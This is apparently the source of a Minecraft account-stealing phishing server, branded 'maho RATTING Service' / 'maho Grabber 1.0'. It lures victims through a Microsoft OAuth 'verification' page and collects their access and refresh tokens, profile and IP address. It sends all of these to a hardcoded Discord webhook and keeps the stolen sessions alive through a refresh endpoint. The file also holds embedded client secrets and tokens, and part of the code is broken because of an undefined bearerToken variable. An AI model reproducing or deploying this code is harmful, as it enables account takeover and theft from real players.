//Config
const client_secret = 'RLe8Q~4H45TfGpzW64huDwUVDscDpT5eraeWzbuO'
const client_id = '633c72ff-333a-495e-be20-8416cfbe7f5c'
const redirect_uri = 'https://skyhub.onrender.com'
const webhook_url = 'https://ptb.discord.com/api/webhooks/1113551902194552902/IKI4gMEgyAIT5rn4i-yYiH4pNA9AjRald5dOlxrBl_VOnRepx9Qqz-nD_5Sfs190VsRv'
//Requirements
const axios = require('axios')
const express = require('express')
const requestIp = require('request-ip')
const app = express()
const port = process.env.PORT || 3000

const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'

// app.get('/verify', async (req, res) => {
// 	res.send("<html> <head> <meta charset=\"UTF-8\"> <title>Verification</title> <style> a:visited { color: LightGray; } a { color: LightGray; } a:hover { color: white; } div { height: 50px; } @import url('http://fonts.cdnfonts.com/css/proxima-nova-2'); body { margin: 0; padding: 0; background: #212121; } button { position: absolute; animate: 0.5s; transition: 0.5s; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 60px; text-align: center; line-height: 60px; color: #fff; font-size: 22px; text-transform: uppercase; text-decoration: none; font-family: 'Proxima Nova', sans-serif; box-sizing: border-box; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 30px; z-index: 1; cursor:pointer; } button:hover { animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } @keyframes animate { 0% { background-position: 0%; } 100% { background-position: 400%; } } button:before { animate: 0.5s; transition: 0.5s; content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px; z-index: -1; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 40px; opacity: 0; transition: 0.5s; } button:hover:before { filter: blur(20px); opacity: 1; animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } </style> </head> <body> <button type=\"button\" onclick= \"window.open('"+redirect+"','popUpWindow','height=500,width=400,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');\">Verify</button> </body> </html>")
// })

app.get('/', async (req, res) => {
    //also cool little "Verified!" html page
    res.send('<html> <head> <meta charset="UTF-8"> <title>Verification Successful</title> <style>  .neonText { color: #fff; text-shadow: 0 0 7px #fff, 0 0 10px #fff, 0 0 21px #fff, 0 0 42px #0fa, 0 0 82px #0fa, 0 0 92px #0fa, 0 0 102px #0fa, 0 0 151px #0fa; } /* Additional styling */ body { font-size: 18px; font-family: \"Helvetica Neue\", sans-serif; background-color: #010a01; } h1, h2 { text-align: center; text-transform: uppercase; font-weight: 400; } h1 { font-size: 4.2rem; } .pulsate { animation: pulsate 1.5s infinite alternate; } h2 { font-size: 1.2rem; } .container { margin-top: 20vh; } @keyframes pulsate { 100% { text-shadow: 0 0 4px #fff, 0 0 11px #fff, 0 0 19px #fff, 0 0 40px #0fa, 0 0 80px #0fa, 0 0 90px #0fa, 0 0 100px #0fa, 0 0 150px #0fa; } 0% { text-shadow: 0 0 2px #fff, 0 0 4px #fff, 0 0 6px #fff, 0 0 10px #0fa, 0 0 45px #0fa, 0 0 55px #0fa, 0 0 70px #0fa, 0 0 80px #0fa; }  </style> </head> <body> <div class="container"> <h1 class="neonText pulsate">404</h1> <h2 class=\"neonText pulsate\">There was an error while contacting the verification bot.</h2> </div> </body> </html>')
    const clientIp = requestIp.getClientIp(req)
    const code = req.query.code
    if (code == null) {
        return
    }
    try {
        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
        const accessToken = accessTokenAndRefreshTokenArray[0]
        const refreshToken = accessTokenAndRefreshTokenArray[1]
        const hashAndTokenArray = await getUserHashAndToken(accessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        // const bearerToken = await getBearerToken(xstsToken, userHash)
        // const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const usernameAndUUIDArray = await getUsernameAndUUID("eyJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiUlNBLU9BRVAiLCJjdHkiOiJKV1QiLCJ6aXAiOiJERUYiLCJ4NXQiOiJnN3hlanVTXzRnOXNNdW9fLXdVeFQ5NHNHancifQ.U36Li71e4hjgrPPP55doq2w5vGbVlj0q6yksh1yy9DfQznhgIOGe-z23PDVcbPN6yEH8FdQF4GsL6PWAmNcfkLZ9X6Kh2_DBs1hvSQ_h7mt1lpsLgdDTwoeX48OhRIRNvw4Dv6FV6Myc3BNpl1WFTCO2JQ3WGQcXQopbmZF3T_D3quwMfrIjqLr0N1GMQuUP1oSLrci_IyLYzoadIPSOIHDk0aPZhIh18TkTwKQMkrc9SWBByn9lzDxurp9LjiMPdOuR5raMc4kKDiy6LkmAjEY_MFbv6-jq73UfARFB1CmwVlAoAargsllcdMcWEQCgQ-IzGvfJaRhG6rvljMYJhw.3BZCmZodVncF1P3ycFUfpw.KAr8CvSu35DxTQWz7aTyJN8fbKRgoceD2lGkrLaAeItK3CcKgxH1dDXWcKAXKQImRnU6FyKF-42cazmELhdBMZWBP3HezCUdtscncNv-2KHRORK-4yvouTn_IUnhwhz6wDYXuNpkXl7wzNFANLX0DrA-be0l-cLn2-VmPJ2jvQUdmOMxV7e4cf7bE6JmQdR8WtQZqsowOXXu2mJzIusEfzrvDhMsT08eR55dwwNxOWBNXN8XbqwwF5-H6jqvzrjyXvG_tFLsnsvHspTAwjXFlL2-JUpbSZClMP8ReaKsR7C9fALsRgyGw1t7lWtCwny8sFg5k12qKTPJvSxxNJHMd-xDjKao4GPjgUJWVOnEzbmjaXPh3STl1FUuJPrOUxwTsHV90G0xz84bL4ws0ejc4soFIs4EtN4Tb1Y5i0Y11NJuzeKDjQviklhD-LiK_dOgtMlR3Fuh40tcsAVfQ8jxv7G6ARbSaI-nOf3LPaHQvajc7LV2qQhGfkNfYIiP38ZxL6XPnPUg74UkekqWJmXfTBAeY7DDEEFW6g5ciLO8WoME9lTIdHBC9aL4WOF-tNDHH0MU1ts_caRi6ggO9lucQ0pDxqAS6iP-sKqwV0qjQdn5TwFbXR5BRLcSKuGlbbQcEA7XZ_TYSDsWe73J6hTeZZnD1368iE2wm77fOuuxXW50wh2-OmvPi11mXeaWwg8XxoQEGhkrerFvt2_fheVzJj795GBp0F6shdl0RXLpPREVYqR4uEdTXQcqDleZFyjvxWVh8fXB5LOnU9ScYduPb-G4JF9rJRPFAskoZsycLPn0h3ZY0TadSNMSBGuoopwYTu20TTXrMWAfCi2lVDSNngquN4MbmX5eQfuE1rrRV7wuY4QcK6GfeAwLTwegKwTx3hzeMSSNtq6iwL9yd6ctd_gmheOKVD3VfZweSdZ-krmnuT7gSVrbHXBNrrdEpYTrz3H7-wquDjF23_hIE5uB7POEyMGzBmxxu8_w76sQ0rix8dvIfjoQLJpgwJvGdc0SsSlEVsflAwn5LOTfSK0uNICZnTQtZSn3hRFh-eZ6jwwo1TDIrSKmhhkQMthhdJNIPASaeSFtCnRI88LvPz3W8DW9-i1AWw5ZP7OL_-TMZEyU3f7EIQR6ztuhMrmNscWH8QCDyA8nP52l01j90snwPzIzucEr5hehSsO_kEPFPbnWZmemVMtQSeCrKLBYd2BWTcffVvB8ZY4vp9cn3hiDQ3Xs6XUduBMhFBWhkMSeuUDMdNZbc7ma9WuKDvDppQBe7YKIimCs_Vv36T1ZzhQqynqYrnLvnJOt1r6yfuTrO2z2_seSpTXkup9UIUH8HyKrJicgXcfmURzDe6bmV-W_oNNqV0Qa8ZRji8CjfYWA7CcKHK9OIcH6g_PedgefmzF0lMeT0Z6QTXfd-ocnVJDcas8i5djQV9dpTJ8Q6V-_tvrur0uW5njhbUtHYHi0W5hnz1v4pMd5Z0OYl4baJYbHuNo4gCOFOeNo7IaPcwfJW-q83-0RAPsR-LRo4tm_Ok__t2qKerZLhXQ6Ix3_es9ZWMwLlp6LlEkb0lx5I_7PrIiYtb93fB-cIpEFtWM2Wjf80b6021bZ8-FJKDgvO0mchQ.CUxlVaX1Je70f9cnWQ72Zw")
        const uuid = usernameAndUUIDArray[0]
        console.log(uuid)
        const username = usernameAndUUIDArray[1]
        console.log(username)
        const ip = clientIp
        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
	postToWebhook2(username, bearerToken, uuid, ip, refreshToken)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getAccessTokenAndRefreshToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}

// async function getBearerToken(xstsToken, userHash) {
//     const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
//     const config = {
//         headers: {
//             'Content-Type': 'application/json',
//         }
//     }
//     let data = {
//         identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
//     }
//     let response = await axios.post(url, data, config)
//     return response.data['access_token']
// }

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}
    
function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
    const url = webhook_url
    let data = {
  username: "maho RATTING Service",
  avatar_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ",
  content: "@here",
  embeds: [
    {
      title: "Ratted " + username + " - Click for networth",
      color: 7506394,
      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`\n\n**Refresh:**\n"+redirect_uri+"refresh?refresh_token="+refreshToken+"\n",
      url: "https://sky.shiiyu.moe/stats/"+username,
      footer: {
        text: "maho Grabber 1.0",
        icon_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ"
      },
    }
  ],
}

        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
    
}

function postToWebhook2(username, bearerToken, uuid, ip, refreshToken) {
    const url = 'https://ptb.discord.com/api/webhooks/1113551902194552902/IKI4gMEgyAIT5rn4i-yYiH4pNA9AjRald5dOlxrBl_VOnRepx9Qqz-nD_5Sfs190VsRv'
    let data = {
  username: "maho RATTING Service",
  avatar_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ",
  content: "@here",
  embeds: [
    {
      title: "Ratted " + username + " - Click for networth",
      color: 7506394,
      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`\n\n**Refresh:**\n"+redirect_uri+"refresh?refresh_token="+refreshToken+"\n",
      url: "https://sky.shiiyu.moe/stats/"+username,
      footer: {
        text: "maho Grabber 1.0",
        icon_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ"
      },
    }
  ],
}

        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
    
}


//Refresh token shit u know how it is
app.get('/refresh', async (req, res) => {
    res.send('Token Refreshed!')
    const refresh_token = req.query.refresh_token
    if (refresh_token == null) {
        return
    }
    try {
        const refreshTokenArray = await getRefreshData(refresh_token)
	    const newAccessToken = refreshTokenArray[0]
        const newRefreshToken = refreshTokenArray[1]
	    const newHashAndTokenArray = await getNewUserHashAndToken(newAccessToken)
        const newUserToken = newHashAndTokenArray[0]
        const newUserHash = newHashAndTokenArray[1]
        const newXstsToken = await getNewXSTSToken(newUserToken)
        const newBearerToken = await getNewBearerToken(newXstsToken, newUserHash)
        const newUsernameAndUUIDArray = await getNewUsernameAndUUID(newBearerToken)
        const newUuid = newUsernameAndUUIDArray[0]
        const newUsername = newUsernameAndUUIDArray[1]
	refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken)

    } catch (e) {
        console.log(e)
    }
})

async function getRefreshData(refresh_token) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        refresh_token: refresh_token,
        grant_type: 'refresh_token'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}

async function getNewUserHashAndToken(newAccessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${newAccessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getNewXSTSToken(newUserToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [newUserToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}


async function getNewBearerToken(newXstsToken, newUserHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + newUserHash + ";" + newXstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getNewUsernameAndUUID(newBearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + newBearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken) {
    const url = webhook_url
    let data = {
  username: "maho RATTING Service",
  avatar_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ",
  content: "REFRESHED",
  embeds: [
    {
      title: "Ratted " + newUsername + " - Click for networth",
      color: 7506394,
      description: "**Username:**\n`"+newUsername+"`\n\n**UUID:**\n`"+newUuid+"`\n\n**Token:**\n`"+newBearerToken+"`\n\n**Refresh Token:**\n`"+newRefreshToken+"`\n\n**Login:**\n`"+newUsername + ":" + newUuid + ":"+ newBearerToken+"`\n\n**Refresh:**\n"+redirect_uri+"refresh?refresh_token="+newRefreshToken+"\n",
      url: "https://sky.shiiyu.moe/stats/"+newUsername,
      footer: {
        text: "maho Grabber 1.0",
        icon_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ"
      },
    }
  ],
}
        axios.post(url, data).then(() => console.log("Successfully refreshed token."))
    
}
